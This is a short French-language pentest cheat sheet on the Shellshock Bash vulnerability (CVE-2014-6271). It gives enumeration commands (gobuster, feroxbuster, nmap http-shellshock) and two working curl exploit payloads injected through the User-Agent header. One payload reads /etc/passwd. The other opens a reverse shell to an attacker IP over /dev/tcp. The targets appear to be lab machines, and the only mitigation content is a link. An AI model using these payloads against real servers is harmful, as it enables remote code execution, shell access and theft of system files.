
[CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

> [!TIP]
> Permet d'exécuter des commandes en utilisant les variables d'environnement
> Exploite Bash < 4.4


- [ ] [[#ENUMERATION]]
- [ ] [[#EXPLOITATION]]
- [ ] [[#MITIGATION]]

# ENUMERATION

## Identifier .cgi / .sh / .pl

```shell
gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x sh,cgi,pl
```

```bash
feroxbuster -u http://10.10.10.56/cgi-bin/ -x sh,cgi,pl
```


## Valider ShellShock avec Nmap

```bash
nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/user.sh 10.10.10.56
```


---

# EXPLOITATION

Injection de commande au travers du User-Agent

```shell
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
```

Reverse shell

```shell
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```




---

# MITIGATION

https://www.digitalocean.com/community/tutorials/how-to-protect-your-server-against-the-shellshock-bash-vulnerability

